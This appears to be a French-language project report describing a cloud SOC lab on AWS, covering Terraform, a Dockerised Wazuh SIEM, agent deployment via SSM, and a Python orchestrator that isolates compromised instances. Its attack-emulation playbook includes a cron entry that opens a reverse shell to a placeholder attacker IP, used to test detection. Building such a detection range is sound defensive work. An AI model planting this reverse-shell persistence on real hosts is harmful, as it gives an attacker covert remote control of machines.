# Cloud SOC – Wazuh Threat Detection & Python Orchestrator
## Technical Architecture and Implementation Guide

**Chapters 4 & 5 - Technical Deep Dive**

---

## Table of Contents

- [Chapter 4: Architecture Technique de la Solution](#chapter-4-architecture-technique)
  - [4.1 Vue d'ensemble de l'architecture](#41-vue-densemble)
  - [4.2 Architecture Cloud AWS](#42-architecture-aws)
  - [4.3 Architecture DevSecOps](#43-architecture-devsecops)
  - [4.4 Architecture SOC](#44-architecture-soc)
  - [4.5 Architecture de Simulation d'Attaque](#45-architecture-simulation)
  - [4.6 Architecture de Réponse Automatisée](#46-architecture-reponse)
  - [4.7 Évolution de l'architecture](#47-evolution-architecture)
  - [4.8 Conclusion](#48-conclusion-chap4)

- [Chapter 5: Implémentation et Réalisation](#chapter-5-implementation)
  - [5.1 Déploiement de l'infrastructure AWS](#51-deploiement-aws)
  - [5.2 Déploiement de la Stack Wazuh](#52-deploiement-wazuh)
  - [5.3 Mise en place des Agents](#53-agents)
  - [5.4 Intégration AWS (S3, ECR, SSM)](#54-integration-aws)
  - [5.5 Développement des Scripts Python](#55-scripts-python)
  - [5.6 Conclusion](#56-conclusion-chap5)

---

# Chapter 4: Architecture Technique de la Solution {#chapter-4-architecture-technique}

## 4.1 Vue d'ensemble de l'architecture {#41-vue-densemble}

### Objectif Global

L'objectif principal de ce projet est de concevoir un environnement unifié de simulation, de détection et de remédiation des incidents de sécurité, capable de couvrir l'ensemble du cycle de gestion des menaces :

- **Émulation d'attaques** (Red Teaming)
- **Supervision centralisée** (Blue Teaming / SIEM)
- **Réponse automatisée** (SOAR)

### Séparation Plan de Contrôle / Plan de Données

Pour garantir la flexibilité et la reproductibilité, l'architecture repose sur un découplage strict :

#### Plan de Contrôle
- **Orchestrateur Python** exécuté localement
- **Interface CLI** (`cloud-soc`) pour piloter les opérations
- Localisation : Machine de l'ingénieur sécurité

#### Plan de Données
- **Infrastructure Cloud** sur Amazon Web Services (AWS)
- **Ressources réseau, machines, composants SOC**
- Localisation : VPC AWS 10.0.0.0/16

### Flux Cyclique Fermé

```
1. Orchestration (CLI Python)
   ↓
2. Red Team (Atomic Red Team / Émulation)
   ↓
3. SIEM (Wazuh - Détection)
   ↓
4. SOAR (Orchestrator.py - Réponse)
   ↓
   [Cycle répété]
```

**Point clé** : Aucune intervention manuelle nécessaire dans le cycle une fois déclenché.

---

## 4.2 Architecture Cloud AWS {#42-architecture-aws}

### 4.2.1 Réseau et Isolation : VPC SOC et Sous-réseaux

#### Configuration du VPC Principal

**Bloc CIDR** : `10.0.0.0/16`

```
VPC: 10.0.0.0/16
├── Subnet Public (NAT) : 10.0.0.0/24
├── Subnet Privé SOC : 10.0.1.0/24
└── Subnet Privé Victime : 10.0.2.0/24
```

#### Sous-réseau Public (NAT Gateway)
- **Bloc CIDR** : `10.0.0.0/24`
- **Rôle** : Hébergement de la passerelle NAT pour trafic outbound
- **Ressources** : NAT Gateway, Elastic IP
- **Accès** : Internet Gateway

#### Sous-réseau Privé SOC
- **Bloc CIDR** : `10.0.1.0/24`
- **Rôle** : Hébergement du cluster Wazuh (cœur du SOC)
- **Instances** : EC2 pour stack Wazuh (Manager, Indexer, Dashboard)
- **Caractéristiques** :
  - Aucune route vers Internet
  - Accès via NAT Gateway uniquement
  - Isolation maximale du cœur SOC

#### Sous-réseau Privé Victime
- **Bloc CIDR** : `10.0.2.0/24`
- **Rôle** : Hébergement des machines cibles pour tests
- **Instances** : EC2 Linux et Windows (machines victim)
- **Caractéristiques** :
  - Cloisonnement strict du SOC
  - Agents Wazuh collectent télémétrie
  - Trafic sécurisé vers SOC (port 1514 TLS)

### 4.2.2 Contrôle des Flux : Security Groups

#### SG-SIEM-Cluster (Cœur Wazuh)

**Règles Entrantes** :
```
Port 1514/TCP (Agent Collection)  ← Depuis 10.0.2.0/24
Port 1515/TCP (Agent Enrollment)  ← Depuis 10.0.2.0/24
Port 9200/TCP (Indexer API)       ← Depuis 10.0.1.0/24 (inter-conteneurs)
Port 443/TCP  (Dashboard HTTPS)   ← Via SSM Port Forwarding SEULEMENT
```

**Règles Sortantes** :
```
Tout trafic permitted (nécessaire pour NAT Gateway)
```

**Caractéristiques** :
- Aucun accès SSH direct (port 22 fermé)
- Aucun accès RDP direct
- Access via AWS Systems Manager (SSM) uniquement

#### SG-Victim-Host (Machines Cibles)

**Règles Entrantes (Normal)** :
```
Port 22/TCP (SSH)     ← Pour déploiement initial
Port 3389/TCP (RDP)   ← Pour Windows (initial)
```

**Règles Sortantes** :
```
Port 1514/TCP (Wazuh Manager)  → 10.0.1.0/24
```

**Transition d'Incident** :
- Lors d'une alerte critique → Remplacement par `SG-Isolation`
- `SG-Isolation` : Tous les trafics entrants/sortants bloqués SAUF SSM

### 4.2.3 Calcul et Services de Support

#### EC2 Instances

**Instance SOC** :
- **Type** : `t3.medium` ou supérieur
- **Subnet** : 10.0.1.0/24 (Privé SOC)
- **Rôle IAM** : Rôle avec permissions Boto3 + SSM
- **Storage** : EBS 50-100 GB

**Instance Victime Linux** :
- **Type** : `t3.small`
- **AMI** : Ubuntu 22.04 LTS
- **Subnet** : 10.0.2.0/24 (Privé Victime)
- **Rôle IAM** : `AmazonSSMManagedInstanceCore`

**Instance Victime Windows** :
- **Type** : `t3.small`
- **AMI** : Windows Server 2022
- **Subnet** : 10.0.2.0/24
- **Rôle IAM** : `AmazonSSMManagedInstanceCore`

#### Identity and Access Management (IAM)

**Rôle pour Instance SOC** :
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ec2:DescribeInstances",
        "ec2:DescribeSecurityGroups",
        "ec2:ModifyInstanceAttribute",
        "ssm:SendCommand",
        "ssm:GetCommandInvocation",
        "ssm:StartSession",
        "ecr:GetAuthorizationToken",
        "ecr:GetDownloadUrlForLayer",
        "ecr:BatchGetImage"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:PutObject",
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::wazuh-logs-*/*"
    }
  ]
}
```

#### ECR (Elastic Container Registry)

**Registre Privé** : `<account-id>.dkr.ecr.<region>.amazonaws.com`

**Images Gérées** :
- `wazuh-manager:4.14.4`
- `wazuh-indexer:4.14.4`
- `wazuh-dashboard:4.14.4`
- Images personnalisées avec outils de sécurité

**Mécanisme d'Authentification** :
```bash
aws ecr get-login-password --region eu-west-3 | \
  docker login --username AWS --password-stdin \
  <account-id>.dkr.ecr.eu-west-3.amazonaws.com
```

#### S3 (Simple Storage Service)

**Bucket Archivage Logs** : `wazuh-logs-<timestamp>`

**Politiques de Sécurité** :
- Versioning activé
- Block Public Access activé
- Encryption par défaut (AES-256)
- Lifecycle policy : Archivage après 90 jours

**Contenu** :
- Alertes Wazuh (JSON)
- Sauvegardes configurations
- Logs d'audit SOC

#### AWS Systems Manager (SSM)

**Composants** :
- **Session Manager** : Tunnels SSH chiffrés sans port 22
- **Run Command** : Exécution de commandes distantes
- **Port Forwarding** : Accès Dashboard Wazuh

**Avantages** :
- Aucun stockage de clés statiques
- Authentification IAM
- Audit complet des opérations

---

## 4.3 Architecture DevSecOps {#43-architecture-devsecops}

### 4.3.1 Infrastructure as Code (IaC) avec Terraform

#### Fichiers Terraform

**Localisation** : `/terraform/`

```
terraform/
├── main.tf                 # Orchestration principale
├── variables.tf            # Variables d'entrée
├── outputs.tf              # Valeurs de sortie
├── providers.tf            # Configuration AWS
├── network.tf              # VPC, subnets, routage
├── security_groups.tf      # Security Groups
├── instance.tf             # Instances EC2
├── iam.tf                  # Rôles IAM
├── ecr.tf                  # Registre ECR
├── s3.tf                   # Buckets S3
├── data.tf                 # Sources de données
├── random.tf               # Générateurs de valeurs aléatoires
├── backend.tf              # Configuration état Terraform
└── .terraform.lock.hcl     # Verrouillage versions providers
```

#### Modularité et Découplage

**Approche Modulaire** :

```hcl
# main.tf - Point d'entrée
terraform {
  required_version = ">= 1.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

module "network" {
  source = "./modules/network"
  vpc_cidr = var.vpc_cidr
  # ...
}

module "security" {
  source = "./modules/security"
  vpc_id = module.network.vpc_id
  # ...
}

module "compute" {
  source = "./modules/compute"
  subnet_id = module.network.private_subnet_id
  iam_role_arn = module.security.iam_role_arn
  # ...
}
```

#### État Terraform

**Fichier d'État** : `terraform.tfstate`

- **Source Unique de Vérité** pour l'infrastructure
- Stocké localement pour ce PoC
- Format JSON avec hashage ressources
- Synchronisation automatique avant chaque `apply`

**Commandes** :
```bash
terraform init      # Initialisation backend
terraform validate  # Validation syntaxe
terraform plan      # Aperçu changements
terraform apply     # Déploiement
terraform destroy   # Destruction ressources
```

### 4.3.2 Conteneurisation avec Docker et Gestion des Images via ECR

#### Docker Compose - Stack Wazuh

**Fichier** : `/wazuh-docker/docker-compose.yml`

```yaml
version: '3.9'

services:
  wazuh.manager:
    image: wazuh/wazuh-manager:4.14.4
    hostname: wazuh.manager
    restart: always
    ports:
      - "1514:1514"      # Agent collection TLS
      - "1515:1515"      # Agent enrollment
      - "514:514/udp"    # Syslog reception
      - "55000:55000"    # API REST
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=${INDEXER_PASSWORD}
      - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
      - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
      - SSL_KEY=/etc/ssl/filebeat.key
    volumes:
      - wazuh_api_configuration:/var/ossec/api/configuration
      - wazuh_etc:/var/ossec/etc
      - wazuh_logs:/var/ossec/logs
      - wazuh_queue:/var/ossec/queue
      - ./config/wazuh_indexer_ssl_certs/:/etc/ssl/
      - ./config/wazuh_cluster/wazuh_manager.conf:/wazuh-config-mount/etc/ossec.conf

  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.14.4
    hostname: wazuh.indexer
    restart: always
    ports:
      - "9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./config/wazuh_indexer_ssl_certs/:/usr/share/wazuh-indexer/config/certs/

  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.14.4
    hostname: wazuh.dashboard
    restart: always
    ports:
      - "443:5601"
    environment:
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=${INDEXER_PASSWORD}
      - WAZUH_API_URL=https://wazuh.manager
      - API_USERNAME=${API_USERNAME}
      - API_PASSWORD=${API_PASSWORD}
    volumes:
      - ./config/wazuh_indexer_ssl_certs/:/usr/share/wazuh-dashboard/certs/

networks:
  wazuh-net:
    driver: bridge

volumes:
  wazuh_api_configuration:
  wazuh_etc:
  wazuh_logs:
  wazuh_queue:
  wazuh-indexer-data:
```

#### Microservices Architecture

**Conteneurs Isolés** :

| Service | Port | Rôle |
|---------|------|------|
| `wazuh.manager` | 1514/1515 | Réception + Analyse |
| `wazuh.indexer` | 9200 | Stockage + Indexation |
| `wazuh.dashboard` | 5601 | Visualisation |

**Avantages** :
- Isolation au niveau application
- Redémarrage indépendant
- Gestion ressources granulaire

### 4.3.3 Pipeline d'exécution et orchestration customisée

#### Moteur d'Orchestration Python

**Localisation** : `/cloudsoc/`

**Composants** :

```
cloudsoc/
├── main.py              # CLI Typer entrypoint
├── orchestrator.py      # Orchestrateurs (Terraform, Deployment, Dashboard)
├── terraform/
│   ├── runner.py        # Wrapper Terraform
│   └── imports.py       # Découverte ressources AWS
├── aws/
│   ├── ec2.py          # Gestion EC2
│   ├── iam.py          # Gestion IAM
│   ├── ssm.py          # AWS Systems Manager
│   ├── ecr.py          # Registre ECR
│   └── s3.py           # Stockage S3
├── deployment/
│   └── executor.py      # Exécuteur playbooks YAML
├── cleanup/
│   └── services.py      # Nettoyage ressources
├── config/
│   └── settings.py      # Configuration .env
└── utils/
    └── logger.py        # Logs structurés
```

#### Architecture CLI

**Entrypoint** : `cloud-soc`

```bash
cloud-soc --help
cloud-soc status
cloud-soc apply --auto-approve
cloud-soc deploy
cloud-soc deploy wazuh
cloud-soc dashboard
cloud-soc destroy --auto-approve --force
```

#### Interprétation Déclarative YAML

**Playbook Exemple** : `/playbooks/emulation/persistence_cron.yml`

```yaml
---
name: "Persistence via Cron"
description: "Simulate malicious cron entry (MITRE T1053.005)"
target: "victim-linux"
steps:
  - name: "Create malicious cron job"
    type: "shell"
    cmd: |
      echo "* * * * * /bin/bash -i >& /dev/tcp/{{ attacker_ip }}/4444 0>&1" | \
      crontab -u {{ target_user }} -
    skip_if_exists: "/var/spool/cron/crontabs/{{ target_user }}"
  
  - name: "Verify execution"
    type: "command"
    cmd: ["crontab", "-l"]
```

---

## 4.4 Architecture SOC {#44-architecture-soc}

### 4.4.1 La Stack Centrale Wazuh (Le Cluster de Supervision)

#### Wazuh Manager (Cerveau du SIEM)

**Rôle** : Analyse centralisée, corrélation d'événements

**Ports** :
- `1514/TCP` : Réception agents (chiffré TLS/Blowfish)
- `1515/TCP` : Authentification agents
- `55000/TCP` : API REST

**Configuration** : `/var/ossec/etc/ossec.conf`

```xml
<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
  </global>

  <remote>
    <connection>secure</connection>
    <port>1514</port>
    <protocol>tcp</protocol>
    <queue_size>131072</queue_size>
  </remote>

  <ruleset>
    <decoder_dir>ruleset/decoders</decoder_dir>
    <rule_dir>ruleset/rules</rule_dir>
    <rule_include>0530-ossec_rules.xml</rule_include>
    <rule_dir>etc/rules</rule_dir>
  </ruleset>
</ossec_config>
```

#### Wazuh Indexer (Plan de Stockage)

**Rôle** : Moteur de recherche OpenSearch (fork Elasticsearch)

**Port** : `9200/TCP`

**Capacités** :
- Indexation documents JSON
- Requêtes complexes (filtrage, agrégations)
- Rétention données (par défaut 90 jours)

**Configuration JVM** : `-Xms1g -Xmx1g` (adaptable à charge)

#### Wazuh Dashboard (Visualisation)

**Rôle** : Interface utilisateur de supervision

**Port** : `443/TCP` (HTTPS)

**Fonctionnalités** :
- Tableaux de bord analytiques
- Recherche en temps réel
- Gestion configuration cluster
- Alertes (notifications par email, webhook)

### 4.4.2 Collecte de la Télémétrie : Les Agents Linux et Windows

#### Enrôlement Sécurisé

**Processus** :

1. Agent contacte Manager sur port `1515`
2. Manager valide demande
3. Génération clé chiffrement unique
4. Stockage local `client.keys`

```bash
# Vérification agents enrôlés
/var/ossec/bin/manage_agents -l

# Sortie
ID: 001, Name: Linux-Victim-Node, IP: 10.0.2.15, Status: Active
ID: 002, Name: Windows-Victim-Node, IP: 10.0.2.32, Status: Active
```

#### Modules de Surveillance Linux

**Logcollector (Log Analysis)** :
- Fichiers monitorés : `/var/log/auth.log`, `/var/log/syslog`
- Real-time processing
- Regex decoding pour extraction champs

**Syscheck (FIM - File Integrity Monitoring)** :
```xml
<syscheck>
  <realtime>yes</realtime>
  <directories realtime="yes">/etc,/bin,/sbin,/tmp</directories>
  <ignore>/etc/mtab</ignore>
</syscheck>
```

**Rootcheck** :
- Détection rootkits
- Vérification conformité système
- Anomalies permissions

#### Modules de Surveillance Windows

**Event Channel Logging** :
- Event ID 4624 : Authentifications réussies
- Event ID 4625 : Authentifications échouées
- Event ID 4698 : Création tâche planifiée

```xml
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
  <filter>Event/System/EventID=4698</filter>
</localfile>
```

---

## 4.5 Architecture de Simulation d'Attaque {#45-architecture-simulation}

### 4.5.1 Framework d'Émulation : Atomic Red Team (ART)

#### Principes

**Modularité Extreme** :
- Chaque technique MITRE ATT&CK = test atomique indépendant
- Dépendances minimales
- Exécution native shell (Bash / PowerShell)

**Absence Agent Persistant** :
- Pas de malware deployé
- Pas de C2 server
- Émulation pure comportementale

#### Structure Répertoires

```
playbooks/emulation/
├── persistence_cron.yml
├── discovery_processes.yml
├── lateral_movement_ssh.yml
└── [autres techniques]
```

### 4.5.2 Cartographie et Alignement avec la Matrice MITRE ATT&CK

#### Techniques Implémentées

| MITRE ID | Tactic | Technique | Playbook |
|----------|--------|-----------|----------|
| T1053.005 | Persistence | Scheduled Task: Cron | `persistence_cron.yml` |
| T1057 | Discovery | Process Discovery | `discovery_processes.yml` |
| T1021.002 | Lateral Movement | SSH | `lateral_movement_ssh.yml` |
| [Voir atomics/] | ... | ... | ... |

### 4.5.3 Architecture Conjointe et Ouverture vers MITRE Caldera

#### Approche Hybride

**Atomic Red Team** (Implémenté) :
- Tests unitaires de détection
- Scénarios simples, reproductibles
- Validation règles SIEM

**MITRE Caldera** (Future) :
- Opérations complexes multi-étapes
- Automatisation offensive adaptive
- C2 centralisé, agents déployés

---

## 4.6 Architecture de Réponse Automatisée {#46-architecture-reponse}

### 4.6.1 Le Moteur d'Orchestration Python (SOAR Customisé)

#### Fonctionnement

**Démon** : `orchestrator.py` exécuté en tâche de fond

**Cycle** :

```
1. Tail fichier alertes Wazuh (/var/ossec/logs/alerts/alerts.json)
   ↓
2. Parse JSON → Extraction rule.id, rule.level, agent.ip
   ↓
3. Évaluation filtres (level >= 10 ? → Action)
   ↓
4. Chargement playbook remédiation
   ↓
5. Exécution via DeploymentTask + Boto3/SSM
   ↓
6. Validation état remédiation
   ↓
   [Cycle répété]
```

### 4.6.2 Interaction avec le Plan de Contrôle : AWS Boto3 et AWS Systems Manager (SSM)

#### Isolation Réseau via Boto3

**Action** : Modification Security Group

```python
import boto3

ec2 = boto3.client('ec2', region_name='eu-west-3')

# Détacher SG production
ec2.modify_instance_attribute(
    InstanceId='i-0123456789abcdef0',
    Groups=['sg-isolation-group-id']
)
```

**Résultat** : Isolation instance en < 2 secondes (hyperviseur AWS)

#### Remédiation Système via SSM Run Command

**Action** : Arrêt processus malveillant

```python
ssm = boto3.client('ssm', region_name='eu-west-3')

ssm.send_command(
    InstanceIds=['i-0123456789abcdef0'],
    DocumentName='AWS-RunShellScript',
    Parameters={
        'commands': [
            'pkill -f malicious_process',
            'rm -f /tmp/backdoor.sh'
        ]
    },
    TimeoutSeconds=300
)
```

**Avantages** :
- Aucun SSH/RDP nécessaire
- Chiffrage natif AWS
- Audit traçable

---

## 4.7 Évolution de l'architecture {#47-evolution-architecture}

### 4.7.1 Architecture Initiale et Objectifs Primitifs

**Approche Monolithique Initiale** :
- Scripts séquentiels linéaires
- Couplage fort Infrastructure + Déploiement
- Accès directs via loopback (127.0.0.1)

### 4.7.2 Difficultés Rencontrées et Verrous Techniques

**Verrou 1 : Docker-in-Docker (Codespaces)** :
- Problème : Reverse proxy stricte, coupures TLS
- Solution : Mode réseau `host`, `forwardPorts` devcontainer.json

**Verrou 2 : Adresses IP Docker éphémères** :
- Problème : IPs changent à chaque redémarrage (172.18.0.X)
- Solution : Noms d'hôtes statiques, `extra_hosts` Docker Compose

**Verrou 3 : Gestion processus zombies SSM** :
- Problème : Tunnels persistants bloquent ports
- Solution : Gestionnaire de sessions persistent, cleanup approprié

### 4.7.3 Évolution vers une Architecture Modulaire et Choix Retenus

**Segmentation Blueprints** :
- Infrastructure `/terraform/`
- Émulation `/playbooks/emulation/`
- Réponse `/playbooks/response/`

**Résolution Réseau** :
- Python socket native pour découverte interfaces actives
- Couplage avec directives devcontainer pour forwarding

**Périmètre Rationalisé** :
- Focus Atomic Red Team (léger)
- Caldera comme future extension (intégration ultérieure)

---

## 4.8 Conclusion {#48-conclusion-chap4}

Ce chapitre a formalisé l'architecture technique globale du Cyber Range Cloud. Les différentes couches architecturales constituent un triptyque :

1. **DevSecOps** : IaC (Terraform) + Conteneurs (Docker) → Déploiement immuable
2. **SOC** : Wazuh SIEM + Agents → Visibilité complète
3. **Automation** : Python Orchestrator + Boto3/SSM → Réaction immédiate

L'évolution documentée démontre une architecture adaptée aux contraintes de production réelles, résiliente et scalable.

---

# Chapter 5: Implémentation et Réalisation {#chapter-5-implementation}

## 5.1 Déploiement de l'infrastructure AWS {#51-deploiement-aws}

### 5.1.1 Organisation et Structure du Code Terraform

**Arborescence** :

```
terraform/
├── main.tf                # Appel modules, provider AWS
├── variables.tf           # Déclaration variables
├── outputs.tf             # Sorties (IDs, IPs)
├── providers.tf           # Configuration provider AWS v5+
├── network.tf             # VPC, subnets, routage
├── security_groups.tf     # Groupes sécurité
├── instance.tf            # Instances EC2
├── iam.tf                 # Rôles/Politiques IAM
├── ecr.tf                 # Registre ECR
├── s3.tf                  # Buckets S3
├── data.tf                # Sources données (AMIs, etc.)
├── random.tf              # Générateurs noms
├── backend.tf             # State storage (local)
└── terraform.tfvars       # Valeurs variables (ignoré git)
```

### 5.1.2 Ressources Cloud Créées

#### VPC et Networking

```hcl
# network.tf
resource "aws_vpc" "wazuh_vpc" {
  cidr_block = "10.0.0.0/16"
  tags = {
    Name = "wazuh-vpc"
    Project = "cloud-soc"
  }
}

resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.wazuh_vpc.id
}

resource "aws_subnet" "nat_public" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.0.0/24"
  map_public_ip_on_launch = true
}

resource "aws_subnet" "management_private" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.1.0/24"
  map_public_ip_on_launch = false
}

resource "aws_subnet" "production_private" {
  vpc_id = aws_vpc.wazuh_vpc.id
  cidr_block = "10.0.2.0/24"
  map_public_ip_on_launch = false
}
```

#### Security Groups

```hcl
# security_groups.tf
resource "aws_security_group" "wazuh_manager" {
  name = "wazuh-manager-sg"
  vpc_id = aws_vpc.wazuh_vpc.id

  # Agent collection
  ingress {
    from_port = 1514
    to_port = 1514
    protocol = "tcp"
    cidr_blocks = ["10.0.2.0/24"]
  }

  # Agent enrollment
  ingress {
    from_port = 1515
    to_port = 1515
    protocol = "tcp"
    cidr_blocks = ["10.0.2.0/24"]
  }
}

resource "aws_security_group" "victim_host" {
  name = "victim-host-sg"
  vpc_id = aws_vpc.wazuh_vpc.id

  # Outbound to Wazuh
  egress {
    from_port = 1514
    to_port = 1514
    protocol = "tcp"
    cidr_blocks = ["10.0.1.0/24"]
  }
}
```

#### Instances EC2

```hcl
# instance.tf
resource "aws_instance" "wazuh_soc" {
  ami = data.aws_ami.ubuntu.id
  instance_type = "t3.medium"
  subnet_id = aws_subnet.management_private.id
  iam_instance_profile = aws_iam_instance_profile.wazuh_profile.name
  security_groups = [aws_security_group.wazuh_manager.id]

  tags = {
    Name = "wazuh-soc-server"
    Role = "siem"
  }
}

resource "aws_instance" "victim_linux" {
  ami = data.aws_ami.ubuntu.id
  instance_type = "t3.small"
  subnet_id = aws_subnet.production_private.id
  iam_instance_profile = aws_iam_instance_profile.victim_profile.name
  security_groups = [aws_security_group.victim_host.id]

  tags = {
    Name = "victim-linux-01"
    Role = "target"
  }
}
```

### 5.1.3 Difficultés Rencontrées et Résolutions Techniques

#### Défi 1 : Duplication Code Terraform (DRY Violation)

**Problème** : Configurations répétitives pour multiples instances/subnets

**Solution** : Utilisation `for_each` et `count`

```hcl
variable "instances" {
  type = map(object({
    instance_type = string
    subnet_key = string
  }))
  
  default = {
    "soc-manager" = {
      instance_type = "t3.medium"
      subnet_key = "management"
    }
    "victim-linux" = {
      instance_type = "t3.small"
      subnet_key = "production"
    }
  }
}

resource "aws_instance" "main" {
  for_each = var.instances
  
  ami = data.aws_ami.ubuntu.id
  instance_type = each.value.instance_type
  subnet_id = aws_subnet.subnets[each.value.subnet_key].id
}
```

#### Défi 2 : Gestion État Terraform (State Locking)

**Problème** : Fichier `terraform.tfstate` corrompu en cas interruption

**Solution** :

```python
# cloudsoc/terraform/runner.py
def run_terraform_command(cmd):
    # Vérifier absence locks orphelins
    lock_file = Path('.terraform.lock.hcl')
    if lock_file.exists():
        lock_file.unlink()
    
    # Refresh état avant apply
    subprocess.run(['terraform', 'refresh'], check=True)
    
    # Exécuter commande
    subprocess.run(['terraform'] + cmd, check=True)
```

---

## 5.2 Déploiement de la Stack Wazuh {#52-deploiement-wazuh}

### 5.2.1 Configuration et Architecture du Docker Compose

**Localisation** : `/wazuh-docker/docker-compose.yml`

**Réseau Bridge** : `wazuh-net`

```yaml
services:
  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.14.4
    ports:
      - "9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./config/wazuh_indexer_ssl_certs/:/usr/share/wazuh-indexer/config/certs/

  wazuh.manager:
    image: wazuh/wazuh-manager:4.14.4
    depends_on:
      - wazuh.indexer
    ports:
      - "1514:1514"
      - "1515:1515"
    volumes:
      - wazuh_logs:/var/ossec/logs
      - ./config/wazuh_cluster/wazuh_manager.conf:/wazuh-config-mount/etc/ossec.conf

  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.14.4
    depends_on:
      - wazuh.manager
      - wazuh.indexer
    ports:
      - "443:5601"
```

### 5.2.2 La Gestion des Certificats TLS et Sécurisation Inter-Intra Conteneurs

#### Génération Certificats

**Script** : `/wazuh-docker/generate-indexer-certs.yml`

```bash
./wazuh-docker/generate-indexer-certs.yml
```

**Résultat** :

```
wazuh-docker/config/wazuh_indexer_ssl_certs/
├── root-ca.pem                    # CA racine
├── root-ca-key.pem                # Clé CA
├── wazuh.indexer.pem              # Certificat Indexer
├── wazuh.indexer-key.pem          # Clé Indexer
├── wazuh.manager.pem              # Certificat Manager
├── wazuh.manager-key.pem          # Clé Manager
├── wazuh.dashboard.pem            # Certificat Dashboard
└── wazuh.dashboard-key.pem        # Clé Dashboard
```

#### Bind Mounts dans Conteneurs

```yaml
volumes:
  - ./config/wazuh_indexer_ssl_certs/root-ca.pem:/usr/share/wazuh-indexer/config/certs/root-ca.pem
  - ./config/wazuh_indexer_ssl_certs/wazuh.indexer.pem:/usr/share/wazuh-indexer/config/certs/node.pem
  - ./config/wazuh_indexer_ssl_certs/wazuh.indexer-key.pem:/usr/share/wazuh-indexer/config/certs/node-key.pem
```

**Avantages** :
- Aucune clé secrète dans image Docker
- Rotation certificats sans reconstruire image
- Isolation chaque conteneur

### 5.2.3 Déboguage et Résolution des Verrous Techniques

#### Problème 1 : Communication Inter-Conteneurs (Host Resolution)

**Symptôme** : Dashboard ne peut pas joindre Manager

**Cause** : Résolution 127.0.0.1 au lieu du nom d'hôte

**Solution** : Directive `extra_hosts`

```yaml
wazuh.dashboard:
  extra_hosts:
    - "wazuh.manager:wazuh.manager"
    - "wazuh.indexer:wazuh.indexer"
  environment:
    - INDEXER_URL=https://wazuh.indexer:9200
```

#### Problème 2 : Quoting Variables d'Environnement

**Symptôme** : URL cassée, connexion Indexer échouée

**Solution** : Sérialisation stricte en Python

```python
# cloudsoc/executor.py
import shlex

def render_environment_variables(self, variables):
    env = {}
    for key, value in variables.items():
        # Validation URLs complexes
        if 'URL' in key or 'ENDPOINT' in key:
            # Vérifier format https://
            if not value.startswith('https://'):
                raise ValueError(f"Invalid URL for {key}: {value}")
        env[key] = str(value)
    return env
```

---

## 5.3 Mise en place des Agents {#53-agents}

### 5.3.1 Déploiement et Configuration sur l'Agent Linux

#### Installation

**Package** : `.deb` Wazuh officiel

```bash
# Via AWS SSM Run Command
aws ssm send-command \
  --instance-ids i-0123456789abcdef0 \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["
    curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
    echo \"deb https://packages.wazuh.com/4.x/apt/ stable main\" > /etc/apt/sources.list.d/wazuh.list
    apt-get update
    WAZUH_MANAGER=10.0.1.45 WAZUH_AGENT_NAME=Linux-Victim-Node apt-get install -y wazuh-agent
    systemctl daemon-reload
    systemctl enable wazuh-agent
    systemctl start wazuh-agent
  "]'
```

#### Configuration

**Fichier** : `/var/ossec/etc/ossec.conf`

```xml
<client>
  <server>
    <address>10.0.1.45</address>
    <port>1514</port>
    <protocol>tcp</protocol>
  </server>
  <client_buffer>
    <disable>no</disable>
    <queue_size>5000</queue_size>
  </client_buffer>
</client>

<syscheck>
  <realtime>yes</realtime>
  <directories realtime="yes">/etc,/bin,/sbin,/tmp</directories>
</syscheck>

<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
```

### 5.3.2 Déploiement et Configuration sur l'Agent Windows

#### Installation MSI

```bash
# Via AWS SSM Run Command
aws ssm send-command \
  --instance-ids i-0987654321abcdef0 \
  --document-name "AWS-RunPowerShellScript" \
  --parameters 'commands=["
    $url = \"https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.4-1.msi\"
    $output = \"$env:TEMP\\wazuh-agent.msi\"
    Invoke-WebRequest -Uri $url -OutFile $output
    msiexec.exe /i $output /q WAZUH_MANAGER=\"10.0.1.45\" WAZUH_AGENT_NAME=\"Windows-Victim-Node\"
    net start WazuhSvc
  "]'
```

#### Configuration Event Channels

```xml
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
  <filter>
    Event/System/EventID=4624 or
    Event/System/EventID=4625 or
    Event/System/EventID=4698
  </filter>
</localfile>
```

### 5.3.3 Sécurisation des Flux et Validation de l'Enrôlement

#### Vérification Enrôlement

```bash
# Sur Manager
/var/ossec/bin/manage_agents -l

# Résultat
ID: 001, Name: Linux-Victim-Node, IP: 10.0.2.15, Status: Active
ID: 002, Name: Windows-Victim-Node, IP: 10.0.2.32, Status: Active
```

#### Chiffrement

**Clé Symétrique** : Générée par Manager lors enrôlement

```bash
# Stockée localement sur agent
cat /var/ossec/etc/client.keys

# Format
001 Linux-Victim-Node 10.0.2.15 7a8f9c2d1b3e4f5a9c8d7e6f5a4b3c2d
```

---

